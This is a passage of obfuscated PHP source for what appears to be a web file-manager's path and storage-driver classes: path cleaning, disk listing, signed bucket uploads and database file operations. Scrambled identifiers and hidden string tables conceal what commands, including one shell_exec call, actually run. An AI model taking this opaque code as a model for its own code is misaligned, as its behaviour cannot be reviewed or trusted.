0) { return !0; } if (strpos($¢®†Õ›«, $ÆØÙï€Ÿ[1268]) === 0) { return !0; } if (strpos($¢®†Õ›«, $ÆØÙï€Ÿ[1302]) === 0) { return !0; } if (strpos($¢®†Õ›«, $ÆØÙï€Ÿ[1303]) === 0) { return !0; } if (strpos($¢®†Õ›«, $ÆØÙï€Ÿ[1304]) === 0) { return !0; } return !1; } public static function clear($‘»ù¸õÊ) { $Ö÷ÛÓÛ‚ =& $_SERVER[”ôÑ§ì¸]; $‘»ù¸õÊ = str_replace(array($Ö÷ÛÓÛ‚[1109], $Ö÷ÛÓÛ‚[245]), $Ö÷ÛÓÛ‚[53], $‘»ù¸õÊ); $‘»ù¸õÊ = str_replace($Ö÷ÛÓÛ‚[97], $Ö÷ÛÓÛ‚[8], $‘»ù¸õÊ); $÷ÏĞŠ— = $Ö÷ÛÓÛ‚[1305]; if (substr($‘»ù¸õÊ, 0, 3) == $Ö÷ÛÓÛ‚[1306]) { $‘»ù¸õÊ = substr($‘»ù¸õÊ, 3); } while (strstr($‘»ù¸õÊ, $÷ÏĞŠ—)) { $‘»ù¸õÊ = str_replace($÷ÏĞŠ—, $Ö÷ÛÓÛ‚[8], $‘»ù¸õÊ); } $‘»ù¸õÊ = preg_replace($Ö÷ÛÓÛ‚[1307], $Ö÷ÛÓÛ‚[8], $‘»ù¸õÊ); if ($‘»ù¸õÊ == $Ö÷ÛÓÛ‚[8]) { return $Ö÷ÛÓÛ‚[8]; } $‘»ù¸õÊ = rtrim($‘»ù¸õÊ, $Ö÷ÛÓÛ‚[8]); return $‘»ù¸õÊ; } public static function pathTrue($”ù¯ã¸Ë) { $öî¦âæ =& $_SERVER[”ôÑ§ì¸]; if (!$”ù¯ã¸Ë) { return $öî¦âæ[12]; } $æ±Ïæİï = strlen($”ù¯ã¸Ë); if (substr($”ù¯ã¸Ë, $æ±Ïæİï - 1, 1) == $öî¦âæ[8]) { $”ù¯ã¸Ë = substr($”ù¯ã¸Ë, 0, $æ±Ïæİï - 1); } $”ù¯ã¸Ë = str_replace($öî¦âæ[560], $öî¦âæ[8], str_replace($öî¦âæ[1308], $öî¦âæ[8], $”ù¯ã¸Ë)); if (substr($”ù¯ã¸Ë, 0, 2) == $öî¦âæ[1309]) { $”ù¯ã¸Ë = substr($”ù¯ã¸Ë, 2); } if (!strstr($”ù¯ã¸Ë, $öî¦âæ[1306])) { return $”ù¯ã¸Ë; } $±Ñè„Ğ‡ = explode($öî¦âæ[8], $”ù¯ã¸Ë); $ê¯ñ¨ = array_search($öî¦âæ[1310], $±Ñè„Ğ‡); if ($ê¯ñ¨ >= 0) { $±Ñè„Ğ‡[$ê¯ñ¨] = -1; } if ($ê¯ñ¨ > 0) { $±Ñè„Ğ‡[$ê¯ñ¨ - 1] = -1; } $şíàÍÂÑ = array(); foreach ($±Ñè„Ğ‡ as $Ú­óöÑ) { if ($Ú­óöÑ !== -1) { $şíàÍÂÑ[] = $Ú­óöÑ; } } return self::pathTrue(implode($öî¦âæ[8], $şíàÍÂÑ)); } public static function sourceID($‚´›ûñÖ) { $ÆÊó»Î =& $_SERVER[”ôÑ§ì¸]; $»†ƒô¨‚ = self::parse($‚´›ûñÖ); if ($»†ƒô¨‚[$ÆÊó»Î[33]] !== self::KOD_SOURCE) { show_json(LNG($ÆÊó»Î[1311]), !1); } return $»†ƒô¨‚[$ÆÊó»Î[442]]; } public static function make($À—Ñ¶ÅÃ) { if (!$À—Ñ¶ÅÃ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($À—Ñ¶ÅÃ)); } public static function makeShare($™È…, $ ¹®Õ‚ª) { return self::makePath(self::KOD_SHARE_ITEM, $™È…, $ ¹®Õ‚ª); } public static function makeFileTypePath($±ëì®¥º) { return self::makePath(self::KOD_USER_FILE_TYPE, $±ëì®¥º); } public static function makeFileTagPath($èÏ¢«¡Ñ) { return self::makePath(self::KOD_USER_FILE_TAG, $èÏ¢«¡Ñ); } public static function makePath($²ßâ…—ö, $×¢’ş“§ = '', $âöÇÓìÖ = '') { $£€ÊºÙ =& $_SERVER[”ôÑ§ì¸]; $£”‡¿ = substr($²ßâ…—ö, 1, -1); $’í§Áò£ = $£€ÊºÙ[1312] . $£”‡¿ . $£€ÊºÙ[1313] . $×¢’ş“§ . $£€ÊºÙ[1314]; $’í§Áò£ = $âöÇÓìÖ ? $’í§Áò£ . $âöÇÓìÖ . $£€ÊºÙ[8] : $’í§Áò£; return $’í§Áò£; } public static function hashPath($é¢ºà¾â, $ä×ŸÓş¡ = true) { $¶Ï›–È =& $_SERVER[”ôÑ§ì¸]; $çõÒÁ— = is_array($é¢ºà¾â) ? $é¢ºà¾â : IO::info($é¢ºà¾â); $ëß“ıÒ¾ = _get($çõÒÁ—, $¶Ï›–È[1315], $¶Ï›–È[12]); if (!$ëß“ıÒ¾ && isset($çõÒÁ—[$¶Ï›–È[218]])) { $ëß“ıÒ¾ = $çõÒÁ—[$¶Ï›–È[218]]; } if (!$ëß“ıÒ¾ && isset($çõÒÁ—[$¶Ï›–È[180]]) && $çõÒÁ—[$¶Ï›–È[180]]) { $çõÒÁ— = IO::info(KodIO::make($çõÒÁ—[$¶Ï›–È[180]])); $ëß“ıÒ¾ = _get($çõÒÁ—, $¶Ï›–È[1315], $¶Ï›–È[12]); } $ñÎ¯”ğÌ = md5($çõÒÁ—[$¶Ï›–È[84]] . $çõÒÁ—[$¶Ï›–È[76]] . $çõÒÁ—[$¶Ï›–È[85]]); if (!$ëß“ıÒ¾ && $ä×ŸÓş¡ && file_exists($çõÒÁ—[$¶Ï›–È[84]])) { $ëß“ıÒ¾ = Cache::get($ñÎ¯”ğÌ . $¶Ï›–È[1316]); $ëß“ıÒ¾ = !1; if (!$ëß“ıÒ¾) { $ëß“ıÒ¾ = IO::hashSimple($çõÒÁ—[$¶Ï›–È[84]]); Cache::set($ñÎ¯”ğÌ . $¶Ï›–È[1316], $ëß“ıÒ¾, 3600 * 24 * 30); } } return $ëß“ıÒ¾ ? $ëß“ıÒ¾ : $ñÎ¯”ğÌ; } public static function hashPathSafe($ø€˜Ú¤Š, $ÅÃŠÀó = true) { $èÉíİ‡ =& $_SERVER[”ôÑ§ì¸]; $´ÑŒ±™† = self::hashPath($ø€˜Ú¤Š, $ÅÃŠÀó); return md5($´ÑŒ±™† . $èÉíİ‡[1317] . Model($èÉíİ‡[792])->get($èÉíİ‡[793])); } public static function initSystemPath() { $ƒşëŠõ =& $_SERVER[”ôÑ§ì¸]; if (defined($ƒşëŠõ[1318])) { return; } define($ƒşëŠõ[1318], self::systemPath($ƒşëŠõ[178])); define($ƒşëŠõ[1319], self::systemPath($ƒşëŠõ[1320])); define($ƒşëŠõ[1321], self::systemPath($ƒşëŠõ[1322])); define($ƒşëŠõ[1323], self::systemPath($ƒşëŠõ[1324])); IOHistory::bindEvent(); } public static function systemPath($—´»‚Õï) { $í…¹‚­ô =& $_SERVER[”ôÑ§ì¸]; $ö›¶Ú¹‰ = $í…¹‚­ô[1325] . ucfirst($—´»‚Õï); $ŠªÖ“û¸ = Model($í…¹‚­ô[792])->get($ö›¶Ú¹‰); if ($ŠªÖ“û¸) { return $ŠªÖ“û¸; } if ($—´»‚Õï == $í…¹‚­ô[178]) { $ŠªÖ“û¸ = self::make(Model($í…¹‚­ô[847])->systemRootPathAdd($í…¹‚­ô[573])); } else { $ŠªÖ“û¸ = self::systemPath($í…¹‚­ô[178]); $ıµÖÜ³„ = self::sourceID($ŠªÖ“û¸); $ŠªÖ“û¸ = self::make(Model($í…¹‚­ô[847])->mkdir($ıµÖÜ³„, $—´»‚Õï)); } Model($í…¹‚­ô[792])->set($ö›¶Ú¹‰, $ŠªÖ“û¸); return $ŠªÖ“û¸; } public static function systemFolder($æ·Ìˆá†) { $—Şû¤Œ = IO_PATH_SYSTEM_SOURCE . $æ·Ìˆá†; $á€øÖ¿· = Cache::get($—Şû¤Œ); if (!$á€øÖ¿·) { $èš„ø¦¿ = IO::infoFullSimple($—Şû¤Œ); if (!$èš„ø¦¿) { $á€øÖ¿· = IO::mkdir($—Şû¤Œ, REPEAT_SKIP); } else { $á€øÖ¿· = $èš„ø¦¿[$_SERVER[”ôÑ§ì¸][84]]; } Cache::set($—Şû¤Œ, $á€øÖ¿·, 3600 * 10); } return $á€øÖ¿·; } public static function defaultDriver() { return Model($_SERVER[”ôÑ§ì¸][789])->defaultDriver(); } public static function defaultIO() { $È»ø¸Äù =& $_SERVER[”ôÑ§ì¸]; $’Ğ±õª¢ = self::defaultDriver(); return $È»ø¸Äù[1326] . $’Ğ±õª¢[$È»ø¸Äù[442]] . $È»ø¸Äù[1314]; } public static function defaultDriverInit() { static $ÁÚÍÂ‚» = false; if ($ÁÚÍÂ‚») { return $ÁÚÍÂ‚»; } $ÁÚÍÂ‚» = IO::init(self::defaultIO()); return $ÁÚÍÂ‚»; } public static function fileTypeList() { $¾­ğ‰ä¡ =& $_SERVER[”ôÑ§ì¸]; $ş‚à¦Êå = $GLOBALS[$¾­ğ‰ä¡[6]][$¾­ğ‰ä¡[1327]]; foreach ($ş‚à¦Êå as $ì¹«ºÕ => $Ô¶‡Àû) { $¹»ğ¢ğ = $¾­ğ‰ä¡[1328] . $ì¹«ºÕ; $¾ßÙÛ‚¯ = LNG($¹»ğ¢ğ); if ($¹»ğ¢ğ != $¾ßÙÛ‚¯) { $ş‚à¦Êå[$ì¹«ºÕ][$¾­ğ‰ä¡[32]] = $¾ßÙÛ‚¯; } } return $ş‚à¦Êå; } public static function diskList($ŠÔ™‚¥ƒ = true) { $°©Ñİ§· = $_SERVER[”ôÑ§ì¸][1329]; if ($ŠÔ™‚¥ƒ) { $¬¥æ–¢ = Cache::get($°©Ñİ§·); if (is_array($¬¥æ–¢)) { return $¬¥æ–¢; } } $¬¥æ–¢ = self::diskListGet(); Cache::set($°©Ñİ§·, $¬¥æ–¢, 60); return $¬¥æ–¢; } public static function diskListGet() { $Ì ëı½ =& $_SERVER[”ôÑ§ì¸]; $÷´í½‡œ = array(); if ($GLOBALS[$Ì ëı½[6]][$Ì ëı½[1330]] == $Ì ëı½[1331]) { $Ñ²”íİˆ = $Ì ëı½[1332]; for ($ãÓ¢°¡° = 0; $ãÓ¢°¡° < strlen($Ñ²”íİˆ); $ãÓ¢°¡°++) { $……È³Şà = $Ñ²”íİˆ[$ãÓ¢°¡°] . $Ì ëı½[1333]; if (file_exists($……È³Şà)) { $÷´í½‡œ[] = $……È³Şà; } } return $÷´í½‡œ; } if (!function_exists($Ì ëı½[98])) { $÷´í½‡œ[] = $Ì ëı½[866]; return $÷´í½‡œ; } $ĞÅÕËäµ = explode($Ì ëı½[245], shell_exec($Ì ëı½[1334])); array_shift($ĞÅÕËäµ); array_pop($ĞÅÕËäµ); $Ùö†ªşò = array($Ì ëı½[1335], $Ì ëı½[1336], $Ì ëı½[1337], $Ì ëı½[1338], $Ì ëı½[1339], $Ì ëı½[1340], $Ì ëı½[1341], $Ì ëı½[1342]); foreach ($ĞÅÕËäµ as $¢²……–¡) { $Üå°Ôè½ = preg_split($Ì ëı½[1343], $¢²……–¡); $……È³Şà = $Üå°Ôè½[count($Üå°Ôè½) - 1]; if (!strstr($Üå°Ôè½[0], $Ì ëı½[1344]) || !$……È³Şà) { continue; } $Á¾‘¬£Á = rtrim($……È³Şà, $Ì ëı½[8]) . $Ì ëı½[8]; if (in_array($Á¾‘¬£Á, $Ùö†ªşò)) { continue; } $÷´í½‡œ[] = $Á¾‘¬£Á; } return $÷´í½‡œ; } public static function isSameDisk($“ìßôôÅ, $İñ¸‡¼£) { $áÕòÏÆ =& $_SERVER[”ôÑ§ì¸]; if ($GLOBALS[$áÕòÏÆ[6]][$áÕòÏÆ[1330]] == $áÕòÏÆ[1331]) { return strtolower(substr($“ìßôôÅ, 0, 1)) == strtolower(substr($İñ¸‡¼£, 0, 1)); } $ì–…²•ß = self::diskList(); $ô‹êˆ ß = !1; $ä¹ìäå› = !1; sort($ì–…²•ß); $ì–…²•ß = array_reverse($ì–…²•ß); $“ìßôôÅ = rtrim($“ìßôôÅ, $áÕòÏÆ[8]) . $áÕòÏÆ[8]; $İñ¸‡¼£ = rtrim($İñ¸‡¼£, $áÕòÏÆ[8]) . $áÕòÏÆ[8]; foreach ($ì–…²•ß as $¶°³Ş€) { $©ó‘”Õı = strlen($¶°³Ş€); if (!$ô‹êˆ ß && substr($“ìßôôÅ, 0, $©ó‘”Õı) == $¶°³Ş€) { $ô‹êˆ ß = $¶°³Ş€; } if (!$ä¹ìäå› && substr($İñ¸‡¼£, 0, $©ó‘”Õı) == $¶°³Ş€) { $ä¹ìäå› = $¶°³Ş€; } if ($ô‹êˆ ß && $ä¹ìäå›) { break; } } return $ô‹êˆ ß === $ä¹ìäå›; } public static function transferType($»“Å¥——, $¸ˆÊº°ì) { $Ê —î²Ê =& $_SERVER[”ôÑ§ì¸]; $ÀÈ­”‡ä = self::driverType($»“Å¥——); $›Œ‡ğ…Ğ = self::driverType($¸ˆÊº°ì); if ($ÀÈ­”‡ä[$Ê —î²Ê[33]] == $›Œ‡ğ…Ğ[$Ê —î²Ê[33]] && $ÀÈ­”‡ä[$Ê —î²Ê[1345]] == $›Œ‡ğ…Ğ[$Ê —î²Ê[1345]]) { return $Ê —î²Ê[1346]; } if ($ÀÈ­”‡ä[$Ê —î²Ê[33]] == $Ê —î²Ê[899] && $›Œ‡ğ…Ğ[$Ê —î²Ê[33]] == $Ê —î²Ê[106]) { return $Ê —î²Ê[1225]; } if ($ÀÈ­”‡ä[$Ê —î²Ê[33]] == $Ê —î²Ê[106] && $›Œ‡ğ…Ğ[$Ê —î²Ê[33]] == $Ê —î²Ê[899]) { return $Ê —î²Ê[107]; } return $Ê —î²Ê[1347]; } public static function driverType($ÀæÀ´×â) { $®¾õôÏ· =& $_SERVER[”ôÑ§ì¸]; $éë¥¾¯ = str_replace($®¾õôÏ·[1348], $®¾õôÏ·[12], strtolower($ÀæÀ´×â->getType())); if ($éë¥¾¯ == $®¾õôÏ·[779] || $éë¥¾¯ == $®¾õôÏ·[1349] || $éë¥¾¯ == $®¾õôÏ·[1350]) { $ÀæÀ´×â = self::defaultDriverInit(); } else { if ($éë¥¾¯ == $®¾õôÏ·[1235] || $éë¥¾¯ == $®¾õôÏ·[1351]) { $ÀæÀ´×â = IO::init($ÀæÀ´×â->pathParse[$®¾õôÏ·[1182]]); } } $Ö‘šË¶ø = $ÀæÀ´×â->path; $éë¥¾¯ = str_replace($®¾õôÏ·[1348], $®¾õôÏ·[12], strtolower($ÀæÀ´×â->getType())); if ($éë¥¾¯ == $®¾õôÏ·[106]) { return array($®¾õôÏ·[33] => $®¾õôÏ·[106], $®¾õôÏ·[1345] => $®¾õôÏ·[12], $®¾õôÏ·[84] => $Ö‘šË¶ø, $®¾õôÏ·[95] => $ÀæÀ´×â); } return array($®¾õôÏ·[33] => $®¾õôÏ·[899], $®¾õôÏ·[1345] => $ÀæÀ´×â->pathDriver, $®¾õôÏ·[84] => $Ö‘šË¶ø, $®¾õôÏ·[95] => $ÀæÀ´×â); } public static function pathDriverType($¢öÇãî”) { return $¢öÇãî” ? self::driverType(IO::init($¢öÇãî”)) : !1; } public static function pathDriverLocal($ğ¤æ¶ˆ) { $÷ÁÇŠôÜ =& $_SERVER[”ôÑ§ì¸]; $ËÁ•æÛ¦ = $ğ¤æ¶ˆ ? self::driverType(IO::init($ğ¤æ¶ˆ)) : !1; return $ËÁ•æÛ¦[$÷ÁÇŠôÜ[33]] == $÷ÁÇŠôÜ[106] ? !0 : !1; } public static function allowCover($¾ßÂ“û”, $Ùû†¹˜ã = true) { $áìĞ‡¶Œ =& $_SERVER[”ôÑ§ì¸]; if (is_string($¾ßÂ“û”)) { $¾ßÂ“û” = IO::info($¾ßÂ“û”); } if (!$¾ßÂ“û” || $¾ßÂ“û”[$áìĞ‡¶Œ[33]] == $áìĞ‡¶Œ[75] || $¾ßÂ“û”[$áìĞ‡¶Œ[76]] <= 100) { return !1; } if (isset($¾ßÂ“û”[$áìĞ‡¶Œ[1352]]) || !$¾ßÂ“û”[$áìĞ‡¶Œ[84]]) { return !1; } if (isset($¾ßÂ“û”[$áìĞ‡¶Œ[215]]) && !$¾ßÂ“û”[$áìĞ‡¶Œ[215]]) { return !1; } static $­Ë±¥˜ = false; if (!$­Ë±¥˜ || !$Ùû†¹˜ã) { $×•ĞùµÓ = self::driverType(IO::init($¾ßÂ“û”[$áìĞ‡¶Œ[84]])); $ğÓ—´‰» = $×•ĞùµÓ[$áìĞ‡¶Œ[95]]; $­Ë±¥˜ = $áìĞ‡¶Œ[183]; if ($×•ĞùµÓ[$áìĞ‡¶Œ[33]] == $áìĞ‡¶Œ[106]) { $­Ë±¥˜ = $áìĞ‡¶Œ[1353]; } if ($×•ĞùµÓ[$áìĞ‡¶Œ[95]] && is_array($×•ĞùµÓ[$áìĞ‡¶Œ[95]]->config)) { $³ç–£ğû = $×•ĞùµÓ[$áìĞ‡¶Œ[95]]->config; if (isset($³ç–£ğû[$áìĞ‡¶Œ[1354]]) && $³ç–£ğû[$áìĞ‡¶Œ[1354]]) { $­Ë±¥˜ = $áìĞ‡¶Œ[1353]; } } } return $­Ë±¥˜ == $áìĞ‡¶Œ[1353] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($‹Ş¾Å€Õ) { parent::__construct($‹Ş¾Å€Õ); $this->signatureVersion($_SERVER[”ôÑ§ì¸][230]); } public function uploadFormData($¦ãŒí¬‡, $é®¿ü÷ = 3600) { $ıºà‹à =& $_SERVER[”ôÑ§ì¸]; $èì€ßû™ = $ıºà‹à[212]; $ùÇŸî¦‰ = $ıºà‹à[246]; $äß™ÓÙØ = $ıºà‹à[256]; $Ó£ëß´î = gmdate($ıºà‹à[1355], time() + $é®¿ü÷); $ùéŞö©ñ = (string) time() . $ıºà‹à[71] . (string) (time() + $é®¿ü÷); $èîÙô ˜ = array($ıºà‹à[257] => $Ó£ëß´î, $ıºà‹à[260] => array(array($ıºà‹à[262] => $èì€ßû™), array($ıºà‹à[261] => $this->bucket), array($ıºà‹à[263], $ıºà‹à[264], $ıºà‹à[12]), array($ıºà‹à[267] => $äß™ÓÙØ), array($ıºà‹à[1356] => $ùÇŸî¦‰), array($ıºà‹à[1357] => $this->accessKey), array($ıºà‹à[1358] => $ùéŞö©ñ))); $èîÙô ˜ = json_encode($èîÙô ˜); $Ä¹ÓÖİê = hash_hmac($ıºà‹à[246], $ùéŞö©ñ, $this->secret); $‡ˆéÚğ› = sha1($èîÙô ˜); $“ºÉ¶«¦ = hash_hmac($ıºà‹à[246], $‡ˆéÚğ›, $Ä¹ÓÖİê); $óĞÁØê¹ = array($ıºà‹à[262] => $èì€ßû™, $ıºà‹à[267] => $äß™ÓÙØ, $ıºà‹à[275] => base64_encode($èîÙô ˜), $ıºà‹à[1356] => $ùÇŸî¦‰, $ıºà‹à[1357] => $this->accessKey, $ıºà‹à[1359] => $ùéŞö©ñ, $ıºà‹à[1360] => $“ºÉ¶«¦, $ıºà‹à[195] => $this->getHost()); return $óĞÁØê¹; } public function fileOutLink($ŸººÊ£å) { $‰ƒœ×Ã„ =& $_SERVER[”ôÑ§ì¸]; if (substr($ŸººÊ£å, 0, 7) == $‰ƒœ×Ã„[1361]) { $ŸººÊ£å = $‰ƒœ×Ã„[1362] . substr($ŸººÊ£å, 7); } header($‰ƒœ×Ã„[161] . $ŸººÊ£å); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($İıÊÎí) { $this->pathParse = $İıÊÎí; $this->model = Model($_SERVER[”ôÑ§ì¸][1363]); } public function getPath($¸Ğ¥øÖâ) { return trim($¸Ğ¥øÖâ, $_SERVER[”ôÑ§ì¸][8]); } public function pathFather($…¶“€óï) { $¥§¥²¼° = $this->parse($…¶“€óï); $¥§¥²¼° = $this->infoSimple($…¶“€óï); return $¥§¥²¼° ? $¥§¥²¼°[$_SERVER[”ôÑ§ì¸][179]] : !1; } public function pathThis($ò©º‹œ—) { $ìŠ“³ŒŠ = $this->infoSimple($ò©º‹œ—); return $ìŠ“³ŒŠ ? $ìŠ“³ŒŠ[$_SERVER[”ôÑ§ì¸][32]] : !1; } public function getPathOuter($˜´Óº¼) { if (!$˜´Óº¼) { return $˜´Óº¼; } $ş”ô Ä˜ = $this->parse($˜´Óº¼); return KodIO::make($ş”ô Ä˜[$_SERVER[”ôÑ§ì¸][442]]); } public function copyFolderFromIO($•ÉÇ¨ê, $å¢áåÈŒ, $»·ÎëÃ, $Ûé»üâ“, $—“ÁÀîñ) { $ÆŒ’§¶ş = $this->model->copyFolderFromIO($•ÉÇ¨ê, $å¢áåÈŒ, $»·ÎëÃ, $Ûé»üâ“, $—“ÁÀîñ); return KodIO::make($ÆŒ’§¶ş); } public function isParentOf($Í©˜„­Ñ, $åÙ¶·—­) { return $this->model->isParentOf($Í©˜„­Ñ, $åÙ¶·—­); } public function mkfile($¹­ş, $ä²Üçºí = '', $Ÿ€éãâ  = REPEAT_RENAME) { $Ÿùó‹†Ò =& $_SERVER[”ôÑ§ì¸]; $í¬›´Ğ = $this->parse($¹­ş); $¹­ş = $í¬›´Ğ[$Ÿùó‹†Ò[442]]; for ($ãôÛ¨Öœ = 0; $ãôÛ¨Öœ < count($í¬›´Ğ[$Ÿùó‹†Ò[1364]]); $ãôÛ¨Öœ++) { $ƒ«¥º× = $í¬›´Ğ[$Ÿùó‹†Ò[1364]][$ãôÛ¨Öœ]; if ($ãôÛ¨Öœ == count($í¬›´Ğ[$Ÿùó‹†Ò[1364]]) - 1) { $¹­ş = $this->model->mkfile($¹­ş, $ƒ«¥º×, $ä²Üçºí, $Ÿ€éãâ ); break; } $¹­ş = $this->model->mkdir($¹­ş, $ƒ«¥º×, REPEAT_SKIP); } return $this->getPathOuter($¹­ş); } public function mkdir($¨»Ä‰ò, $£ÎÊ´›Ì = REPEAT_SKIP) { $‚ºöİœÁ =& $_SERVER[”ôÑ§ì¸]; $á€¡Ÿô = $this->parse($¨»Ä‰ò); $¨»Ä‰ò = $á€¡Ÿô[$‚ºöİœÁ[442]]; for ($¹´–‰Ñ = 0; $¹´–‰Ñ < count($á€¡Ÿô[$‚ºöİœÁ[1364]]); $¹´–‰Ñ++) { $·ÁôªøŞ = $á€¡Ÿô[$‚ºöİœÁ[1364]][$¹´–‰Ñ]; $¨»Ä‰ò = $this->model->mkdir($¨»Ä‰ò, $·ÁôªøŞ, $£ÎÊ´›Ì); } return $this->getPathOuter($¨»Ä‰ò); } public function copyFile($“çˆé÷ê, $ö£Óµ¥¬, $ø¨Êû¢À = REPEAT_REPLACE) { $ªÑÈÉ¼Õ =& $_SERVER[”ôÑ§ì¸]; $ÖÍÎÎ¿ = $this->parse($ö£Óµ¥¬); $›®†Í = $this->model->copy($“çˆé÷ê, $ÖÍÎÎ¿[$ªÑÈÉ¼Õ[442]], $ø¨Êû¢À, $ÖÍÎÎ¿[$ªÑÈÉ¼Õ[84]]); return $›®†Í ? $this->getPathOuter($›®†Í) : !1; } public function moveFile($üõ®Âİº, $ØéäÀ‚¥, $¬€å‹ = REPEAT_REPLACE) { $àë÷´ßÏ =& $_SERVER[”ôÑ§ì¸]; $œ°Ğ¦éÚ = $this->parse($ØéäÀ‚¥); $¾ƒùî¿‡ = $this->model->move($üõ®Âİº, $œ°Ğ¦éÚ[$àë÷´ßÏ[442]], $¬€å‹, $œ°Ğ¦éÚ[$àë÷´ßÏ[84]]); return $¾ƒùî¿‡ ? $this->getPathOuter($¾ƒùî¿‡) : !1; } public function copy($ŞÎèøÊ, $õ˜™´¨­, $Û£ÏÅ¾Ù = REPEAT_REPLACE, $©êˆç–Ò = false) { $‚ƒˆÛÛ = $this->parse($õ˜™´¨­); $¯©Ãß± = $this->model->copy($ŞÎèøÊ, $‚ƒˆÛÛ[$_SERVER[”ôÑ§ì¸][442]], $Û£ÏÅ¾Ù, $©êˆç–Ò); return $¯©Ãß± ? $this->getPathOuter($¯©Ãß±) : !1; } public function moveSameAllow() { } public function move($¢Éé¢íä, $’‚§õ«á, $„–ûŞƒ€ = REPEAT_REPLACE, $•£¶ìËš = false) { $âƒŸ¬™¶ = $this->parse($’‚§õ«á); $ˆ•ƒèş£ = $this->model->move($¢Éé¢íä, $âƒŸ¬™¶[$_SERVER[”ôÑ§ì¸][442]], $„–ûŞƒ€, $•£¶ìËš); return $ˆ•ƒèş£ ? $this->getPathOuter($ˆ•ƒèş£) : !1; } public function remove($ĞóÌÚ×˜, $œ©ğÄù¢ = true) { return $this->model->remove($ĞóÌÚ×˜, $œ©ğÄù¢); } public function rename($Û»¶û¤, $–÷¨ğ) { $ò–²–† = $this->model->rename($Û»¶û¤, $–÷¨ğ); return $ò–²–† ? $this->getPathOuter($Û»¶û¤) : $ò–²–†; } public function size($´•ã°Ÿ²) { $ ¹ªÆÏ = $this->infoSimple($´•ã°Ÿ²); return $ ¹ªÆÏ ? $ ¹ªÆÏ[$_SERVER[”ôÑ§ì¸][76]] : 0; } public function infoSimple($½ñ˜×Ú) { return $this->model->sourceInfo($½ñ˜×Ú); } public function info($„ò±ÇÏ¼) { return $this->infoParse($„ò±ÇÏ¼); } public function infoAuth($²éÊ„Œ) { return $this->infoParse($²éÊ„Œ, !1, !0); } public function infoWithChildren($äÎèÓ´ğ) { return $this->infoParse($äÎèÓ´ğ, !0); } protected function infoParse($Ô­ÆÜê, $ˆ¾»ôÜŞ = false, $¬ÔĞò = false) { if (!$ˆ¾»ôÜŞ) { return $this->model->pathInfo($Ô­ÆÜê, $¬ÔĞò); } return $this->model->pathInfoMore($Ô­ÆÜê); } public function infoFullSimple($ûÈú•¤·) { $¥‘ö³å´ =& $_SERVER[”ôÑ§ì¸]; $Ë®Œ†ùŠ = explode($¥‘ö³å´[8], $ûÈú•¤·); $ã¯ÔÇßÈ = implode($¥‘ö³å´[8], array_splice($Ë®Œ†ùŠ, 1)); return $this->model->pathInfoByPath($Ë®Œ†ùŠ[0], $ã¯ÔÇßÈ); } public function infoFull($ŒÙÏ­øÂ) { $à¢»ú“‹ = $this->infoFullSimple($ŒÙÏ­øÂ); return is_array($à¢»ú“‹) ? $this->model->pathInfo($à¢»ú“‹[$_SERVER[”ôÑ§ì¸][180]]) : !1; } public function hashSimple($•„ï•Åù) { $ÄËõ§˜à =& $_SERVER[”ôÑ§ì¸]; $¾©š‰·— = $this->infoWithChildren($•„ï•Åù); return $¾©š‰·—[$ÄËõ§˜à[515]][$ÄËõ§˜à[639]]; } public function hashMd5($¿“º¦ª) { $ô¬óü¡† =& $_SERVER[”ôÑ§ì¸]; $—î–É¨ø = $this->infoWithChildren($¿“º¦ª); return $—î–É¨ø[$ô¬óü¡†[515]][$ô¬óü¡†[640]]; } public function exist($ØÂ¤ìºä) { $€éà¨„ =& $_SERVER[”ôÑ§ì¸]; $ÚÒÃ²±¦ = $this->parse($ØÂ¤ìºä); if (!$ÚÒÃ²±¦[$€éà¨„[84]]) { return $this->isFile($ØÂ¤ìºä) || $this->isFolder($ØÂ¤ìºä); } $Ô¾¸³ = array($€éà¨„[444] => $ÚÒÃ²±¦[$€éà¨„[442]], $€éà¨„[32] => $ÚÒÃ²±¦[$€éà¨„[84]]); $ß²¥¶¢º = $this->model->where($Ô¾¸³)->find(); return $ß²¥¶¢º ? !0 : !1; } public function isFile($Û¤ê¬¤±) { $ıÔæ³ûû =& $_SERVER[”ôÑ§ì¸]; $Æº«¯™Ä = $this->infoSimple($Û¤ê¬¤±); return $Æº«¯™Ä && $Æº«¯™Ä[$ıÔæ³ûû[452]] == $ıÔæ³ûû[211] ? !0 : !1; } public function isFolder($´íÂÙÊ°) { $ÔãÏ»¢£ =& $_SERVER[”ôÑ§ì¸]; $ªŸ»Ë•Ô = $this->infoSimple($´íÂÙÊ°); return $ªŸ»Ë•Ô && $ªŸ»Ë•Ô[$ÔãÏ»¢£[452]] == $ÔãÏ»¢£[88] ? !0 : !1; } public function listPath($ßªß‡Äå, $öíÃïØİ = false) { $ŠÅ¿ØŸ“ =& $_SERVER[”ôÑ§ì¸]; if ($ßªß‡Äå == $ŠÅ¿ØŸ“[12]) { return !1; } $º†ÔûÈ = array($ŠÅ¿ØŸ“[444] => $ßªß‡Äå); if ($öíÃïØİ) { return $this->model->listSource($º†ÔûÈ, -1); } return $this->model->listSource($º†ÔûÈ); } public function has($÷á•Î¾Ò, $îŸõÓ‚ê = false, $âÆö«õÆ = null) { $ãı”³‚ =& $_SERVER[”ôÑ§ì¸]; $ìãƒ¹¿¨ = $this->infoWithChildren($÷á•Î¾Ò); if ($îŸõÓ‚ê) { return array($ãı”³‚[223] => $ìãƒ¹¿¨[$ãı”³‚[223]], $ãı”³‚[222] => $ìãƒ¹¿¨[$ãı”³‚[222]]); } return $âÆö«õÆ ? $ìãƒ¹¿¨[$ãı”³‚[223]] : $ìãƒ¹¿¨[$ãı”³‚[222]]; } public function listAll($µğ²§Š•) { $Æª¼ÙÎÃ = IO::info($this->pathParse[$_SERVER[”ôÑ§ì¸][84]]); if (!$Æª¼ÙÎÃ) { return array(); } return $this->model->listAll($µğ²§Š•); } public function getContent($ñä¬¢‘à) { return $this->model->getContent($ñä¬¢‘à); } public function setContent($Æ¬º“ïñ, $Áú ˆı‘ = '') { return $this->model->setContent($Æ¬º“ïñ, $Áú ˆı‘); } public function fileSubstr($ì•¹¶Š×, $ ˆ£»Æ®, $¨èÏÌ±Ç) { return $this->model->fileSubstr($ì•¹¶Š×, $ ˆ£»Æ®, $¨èÏÌ±Ç); } public function download($öë¾¹’¥, $‘µİöÂÍ = '') { $”Õñë‹ = get_path_father($‘µİöÂÍ); $ªªÏôìı = get_path_this($‘µİöÂÍ); $ÎşÒ ãê = 